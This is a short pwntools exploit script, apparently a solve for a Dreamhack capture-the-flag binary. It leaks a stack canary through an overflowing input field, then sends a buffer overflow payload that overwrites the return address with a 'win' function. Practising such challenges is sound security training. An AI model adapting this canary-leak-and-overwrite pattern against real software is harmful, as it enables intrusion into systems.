#!/usr/bin/env python3
from pwn import *

PORT = 8447
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

win = 0x0000000000401216

p.sendafter(b"name: ", b'A'*56)
p.sendlineafter(b"age: ", str(-1).encode())
# input()
p.sendlineafter(b"height: ",str(1.1).encode())
p.sendafter(b"Enter M (Male) or F (Female): ", b'B'*5)
p.recvuntil(b"B"*5)

canary = u64(b'\x00' + p.recv(7) )
print(b'canary: ', hex(canary))

pl = b"A"*0x68 + p64(canary) + b'B'*8 + p64(win)

p.sendafter(b"your nationality? ", pl)

p.interactive()